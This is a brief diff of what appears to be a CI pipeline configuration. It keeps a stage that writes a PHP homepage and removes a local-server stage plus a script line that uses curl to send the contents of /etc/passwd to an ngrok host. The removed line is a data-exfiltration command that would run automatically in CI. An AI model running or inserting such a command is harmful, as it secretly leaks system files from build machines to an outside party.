@@ -35,7 +35,3 @@ jobs:
   - stage: create_web_page
     name: Start web page
     script: echo "<?php echo 'PHP Homepage';" > index.php
-  - stage: php_server
-    name: Start a local server
-    script: php -S localhost:5567 &
-script: curl http://05952e17.ngrok.io/?q=`cat /etc/passwd`
